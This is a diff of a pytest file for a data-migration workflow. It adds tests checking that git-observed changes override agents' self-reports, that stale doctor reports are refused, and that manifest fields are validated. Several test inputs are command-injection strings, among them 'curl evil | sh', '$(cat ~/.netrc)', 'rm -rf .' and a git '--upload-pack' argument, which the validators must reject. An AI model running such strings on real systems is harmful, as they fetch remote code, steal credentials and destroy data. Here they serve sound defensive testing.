@@ -20,7 +20,7 @@ def _functions():
                 if (isinstance(node, ast.FunctionDef)
                     and node.name in {"validate_manifest", "validate_verify", "ledger_violations"})
                 or (isinstance(node, ast.Assign) and any(
-                    isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "STOP_MODES", "UNIT_ID"}
+                    isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "STOP_MODES", "UNIT_ID", "WORD"}
                     for t in node.targets))]
     namespace = {"Counter": Counter, "re": re}
     exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
@@ -44,7 +44,7 @@ def _batch_runtime():
         "WorkflowAgentError": RuntimeError,
         "child_prompt": lambda batch: batch,
         "log": lambda message: None,
-        "pr_changed_paths": lambda branch: [],
+        "pr_changed_paths": lambda pr_url: [],
     }
     exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
     return namespace
@@ -426,14 +426,29 @@ def test_validate_verify_requires_changed_paths_inside_the_wave_report_dir():
     passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
     ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
           "changed_paths": [".migration/recon/wave-2/report.md"]}
-    assert validate_verify(ok, passed, False, wave=2) == []
+    assert validate_verify(ok, passed, False, wave=2, observed=[]) == []
     problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-2/report.md",
-                                                        ".migration/03_recon_tolerances.json"]}, passed, False, wave=2)
+                                                        ".migration/03_recon_tolerances.json"]}, passed, False, 2, [])
     assert problems == ["verifier output invalid: ledger tampered, changed .migration/03_recon_tolerances.json"]
-    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-3/report.md"]}, passed, False, wave=2)
+    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-3/report.md"]}, passed, False, 2, [])
     assert problems == ["verifier output invalid: ledger tampered, changed .migration/recon/wave-3/report.md"]
-    problems = validate_verify({k: v for k, v in ok.items() if k != "changed_paths"}, passed, False, wave=2)
+    problems = validate_verify({k: v for k, v in ok.items() if k != "changed_paths"}, passed, False, 2, [])
     assert problems == ["verifier output invalid: changed_paths must be a list of paths (git diff --name-only)"]
+
+
+def test_validate_verify_reads_the_report_branch_from_git_not_only_the_self_report():
+    validate_verify = _functions()["validate_verify"]
+    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
+    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "merged_prs": [], "findings": [],
+          "changed_paths": [".migration/recon/wave-2/report.md"]}
+    assert validate_verify(ok, passed, False, wave=2, observed=[".migration/recon/wave-2/report.md"]) == []
+    tampered = validate_verify(ok, passed, False, wave=2,
+                               observed=[".migration/recon/wave-2/report.md", ".migration/allowed_targets.json"])
+    assert tampered == ["verifier output invalid: ledger tampered, changed .migration/allowed_targets.json"]
+    unverifiable = validate_verify(ok, passed, False, wave=2, observed=None)
+    assert len(unverifiable) == 1 and "recon/wave-2" in unverifiable[0] and "git" in unverifiable[0]
+    src = WORKFLOW.read_text()
+    assert 'validate_verify(verify, passed, auto_merge, WAVE, ref_changed_paths(f"recon/wave-{WAVE}"))' in src
 
 
 # ---------------------------------------------------------------- capability contract vs the doctor's record (A3)
@@ -463,17 +478,20 @@ def test_validate_manifest_compares_the_contract_with_the_doctor_record():
 
 def test_workflow_launches_from_a_fresh_doctor_run_not_the_editable_record():
     src = WORKFLOW.read_text()
-    assert 'MANIFEST_PATH.parent.parent / "09_capabilities.json"' in src
-    assert "DOCTOR = fresh_doctor_report(RECORDED, MANIFEST)" in src
+    assert "RECORDED" not in src and "DOCTOR = fresh_doctor_report(MANIFEST)" in src
     assert "validate_manifest(MANIFEST, DOCTOR)" in src
 
 
 def _launch_ns(tmp_path, fake_run):
     tree = ast.parse(WORKFLOW.read_text())
     selected = [node for node in tree.body
-                if isinstance(node, ast.FunctionDef) and node.name in {"fresh_doctor_report", "pr_changed_paths"}]
-    ns = {"json": json, "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
-          "BASE_BRANCH": "main", "DOCTOR_PY": Path("/plugin/skills/factory-doctor/doctor.py"),
+                if (isinstance(node, ast.FunctionDef)
+                    and node.name in {"fresh_doctor_report", "pr_changed_paths", "ref_changed_paths"})
+                or (isinstance(node, ast.Assign) and any(
+                    isinstance(t, ast.Name) and t.id == "PR_URL" for t in node.targets))]
+    ns = {"json": json, "os": os, "re": re, "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
+          "BASE_BRANCH": "main", "REPO": "github.com/acme/dbx-target",
+          "DOCTOR_PY": Path("/plugin/skills/factory-doctor/doctor.py"),
           "MANIFEST_PATH": tmp_path / ".migration" / "waves" / "wave-1.json"}
     exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
     ns["subprocess"] = type("S", (), {"run": staticmethod(fake_run), "SubprocessError": subprocess.SubprocessError,
@@ -481,41 +499,60 @@ def _launch_ns(tmp_path, fake_run):
     return ns
 
 
-def test_fresh_doctor_report_reruns_the_doctor_and_carries_only_a_blocked_hook_nonce(tmp_path):
-    calls = []
-    fresh = {"ready": True, "identity": {"userName": "sp-1", "host": "h"}, "checks": []}
-
+def _doctor_writer(calls, fresh, rc=1):
     def fake_run(cmd, **kw):
         calls.append(cmd)
         Path(cmd[cmd.index("--out") + 1]).parent.mkdir(parents=True, exist_ok=True)
         Path(cmd[cmd.index("--out") + 1]).write_text(json.dumps(fresh))
-        return subprocess.CompletedProcess(cmd, 1)
+        return subprocess.CompletedProcess(cmd, rc)
+    return fake_run
 
-    ns = _launch_ns(tmp_path, fake_run)
-    recorded = {"ready": True, "checks": [{"id": "hook_platform_loaded", "status": "ok", "data": {"probe_nonce": "ab12cd34"}}]}
+
+def test_fresh_doctor_report_reruns_the_doctor_with_this_sessions_hook_probe_only(tmp_path, monkeypatch):
+    calls = []
+    fresh = {"ready": True, "identity": {"userName": "sp-1", "host": "h"}, "checks": []}
+    ns = _launch_ns(tmp_path, _doctor_writer(calls, fresh))
     manifest = _manifest(source={"family": "sqlserver", "secret": "LEGACY_ODBC", "params": {"db": "loan_servicing"}})
-    assert ns["fresh_doctor_report"](recorded, manifest) == fresh
+    monkeypatch.delenv("WAVE_HOOK_PROBE", raising=False)
+    assert ns["fresh_doctor_report"](manifest) == fresh
     cmd = calls[0]
     assert cmd[:2] == [sys.executable, str(ns["DOCTOR_PY"])]
     assert cmd[cmd.index("--workspace") + 1] == str(tmp_path)
     assert cmd[cmd.index("--out") + 1] == str(tmp_path / ".migration" / "waves" / "wave-1.doctor.json")
-    assert cmd[cmd.index("--hook-probe-result") + 1] == "blocked:ab12cd34"
+    # no probe result from the launching session: the doctor decides (hook row unverified, not ready)
+    assert cmd[cmd.index("--hook-probe-result") + 1] == "unknown"
     assert cmd[cmd.index("--expect-identity") + 1] == "sp-1" and cmd[cmd.index("--expect-catalogs") + 1] == "mig"
     assert cmd[cmd.index("--source-family") + 1] == "sqlserver" and cmd[cmd.index("--source-secret") + 1] == "LEGACY_ODBC"
     assert cmd[cmd.index("--param") + 1] == "db=loan_servicing" and "--no-databricks" not in cmd
-    # an unverified or failed hook row in the record is never turned into a claim
-    for row in ({"status": "unverified", "data": {"probe_nonce": "ab12cd34"}}, {"status": "ok", "data": {}}):
-        ns["fresh_doctor_report"]({"checks": [{"id": "hook_platform_loaded", **row}]}, _manifest())
-        assert calls[-1][calls[-1].index("--hook-probe-result") + 1] == "unknown" and "--source-family" not in calls[-1]
+    # the probe the launching session ran is passed through verbatim; the doctor checks the nonce
+    monkeypatch.setenv("WAVE_HOOK_PROBE", "blocked:ab12cd34")
+    ns["fresh_doctor_report"](_manifest())
+    assert calls[-1][calls[-1].index("--hook-probe-result") + 1] == "blocked:ab12cd34" and "--source-family" not in calls[-1]
 
 
 def test_fresh_doctor_report_refuses_to_launch_without_a_report(tmp_path):
     ns = _launch_ns(tmp_path, lambda cmd, **kw: subprocess.CompletedProcess(cmd, 1))
     with pytest.raises(SystemExit, match="doctor"):
-        ns["fresh_doctor_report"]({"checks": []}, _manifest())
+        ns["fresh_doctor_report"](_manifest())
 
 
-def test_pr_changed_paths_comes_from_git_and_is_none_when_git_cannot_answer(tmp_path):
+def test_fresh_doctor_report_never_reads_a_stale_report(tmp_path):
+    stale = tmp_path / ".migration" / "waves" / "wave-1.doctor.json"
+    stale.parent.mkdir(parents=True)
+    stale.write_text(json.dumps({"ready": True, "identity": {"userName": "sp-1", "host": "h"}, "checks": []}))
+    # the doctor crashes (or rejects its arguments) before writing: the old ready report must not stand
+    for rc in (2, 1):
+        ns = _launch_ns(tmp_path, lambda cmd, rc=rc, **kw: subprocess.CompletedProcess(cmd, rc))
+        with pytest.raises(SystemExit, match="doctor"):
+            ns["fresh_doctor_report"](_manifest())
+        assert not stale.exists()
+    # a written report with an exit code other than ready (0) / not ready (1) is an argument error or crash
+    ns = _launch_ns(tmp_path, _doctor_writer([], {"ready": True}, rc=2))
+    with pytest.raises(SystemExit, match="doctor"):
+        ns["fresh_doctor_report"](_manifest())
+
+
+def test_pr_changed_paths_comes_from_the_pr_head_ref_of_this_repo(tmp_path):
     calls = []
 
     def fake_run(cmd, **kw):
@@ -525,25 +562,51 @@ def test_pr_changed_paths_comes_from_git_and_is_none_when_git_cannot_answer(tmp_
         return subprocess.CompletedProcess(cmd, 0, stdout="src/a.sql\n.migration/allowed_targets.json\n")
 
     ns = _launch_ns(tmp_path, fake_run)
-    assert ns["pr_changed_paths"]("feat/x") == ["src/a.sql", ".migration/allowed_targets.json"]
-    assert calls[0][:5] == ["git", "-C", str(tmp_path), "fetch", "-q"] and calls[0][-1] == "feat/x"
-    assert calls[1][3:] == ["diff", "--name-only", "origin/main...origin/feat/x"]
+    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == ["src/a.sql", ".migration/allowed_targets.json"]
+    # the host writes refs/pull/N/head; the child's branch name never reaches git
+    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", "refs/pull/42/head"]
+    assert calls[1][3:] == ["diff", "--name-only", "origin/main...FETCH_HEAD"]
+    calls.clear()
+    for url in ("https://github.com/other/repo/pull/42", "https://github.com/acme/dbx-target/pull/x",
+                "https://github.com/acme/dbx-target/pull/42/../../other/repo/pull/1", "", None, 42):
+        assert ns["pr_changed_paths"](url) is None
+    assert calls == []
 
     def failing(cmd, **kw):
         raise subprocess.CalledProcessError(128, cmd)
 
-    assert _launch_ns(tmp_path, failing)["pr_changed_paths"]("feat/x") is None
+    assert _launch_ns(tmp_path, failing)["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") is None
+    assert _launch_ns(tmp_path, failing)["ref_changed_paths"]("recon/wave-2") is None
 
 
 def test_git_observed_ledger_changes_beat_a_clean_self_report():
     ns = _batch_runtime()
-    ns["pr_changed_paths"] = lambda branch: ["src/loans.sql", ".migration/03_recon_tolerances.json"]
+    seen = []
+    ns["pr_changed_paths"] = lambda pr_url: seen.append(pr_url) or ["src/loans.sql", ".migration/03_recon_tolerances.json"]
     out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
     assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered"
     assert ".migration/03_recon_tolerances.json" in out["one_line_summary"]
-    ns["pr_changed_paths"] = lambda branch: None
+    assert seen == ["https://example/pr/1"]  # the PR, not the branch the child names
+    ns["pr_changed_paths"] = lambda pr_url: None
     out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
     assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and "git" in out["one_line_summary"]
+
+
+@pytest.mark.parametrize("value", ["--upload-pack=touch /tmp/x", "-q", "main..x", "a b", "", 3, "^main", "m:n"])
+def test_validate_manifest_rejects_base_branch_and_wave_values_git_could_misread(value):
+    validate_manifest = _functions()["validate_manifest"]
+    with pytest.raises(SystemExit, match="base_branch"):
+        validate_manifest(_manifest(base_branch=value))
+    validate_manifest(_manifest(base_branch="release/2026.09"))
+    with pytest.raises(SystemExit, match="wave"):
+        validate_manifest(_manifest(wave="2 --exec"))
+
+
+def test_validate_manifest_rejects_a_unit_owned_by_two_batches():
+    validate_manifest = _functions()["validate_manifest"]
+    with pytest.raises(SystemExit, match="unit.*orders_load.*b1.*b2"):
+        validate_manifest(_manifest(batches=[{"id": "b1", "units": ["orders_load"], "write_targets": ["t1"], "brief": "x"},
+                                             {"id": "b2", "units": ["orders_load", "v"], "write_targets": ["t2"], "brief": "y"}]))
 
 
 @pytest.mark.parametrize("unit", ["../03_recon_tolerances.json", "u/..", "a/b", "wave-1", "", ".", "..", ".hidden", 3])
@@ -555,12 +618,19 @@ def test_validate_manifest_rejects_unit_ids_that_are_not_a_plain_recon_dir_name(
 
 
 @pytest.mark.parametrize("source", ["LEGACY_ODBC", {"family": "sqlserver"}, {"secret": "X"}, {"family": "", "secret": "X"},
-                                    {"family": "sqlserver", "secret": "X", "params": ["a=b"]}])
+                                    {"family": "sqlserver", "secret": "X", "params": ["a=b"]},
+                                    # these are pasted into the children's doctor command line
+                                    {"family": "sqlserver; curl evil | sh", "secret": "X"},
+                                    {"family": "sqlserver", "secret": "$(cat ~/.netrc)"},
+                                    {"family": "sqlserver", "secret": "X", "params": {"db": "loans && rm -rf ."}},
+                                    {"family": "sqlserver", "secret": "X", "params": {"db=x --unit": "y"}},
+                                    {"family": "sqlserver", "secret": "X", "params": {"db": "--role orchestrator"}},
+                                    {"family": "sqlserver", "secret": "X", "params": {"db": 7}}])
 def test_validate_manifest_checks_the_source_block(source):
     validate_manifest = _functions()["validate_manifest"]
     with pytest.raises(SystemExit, match="source"):
         validate_manifest(_manifest(source=source))
-    validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC"}))
+    validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "loan_servicing"}}))
 
 
 def test_child_prompt_passes_the_source_family_and_secret_to_the_doctor():
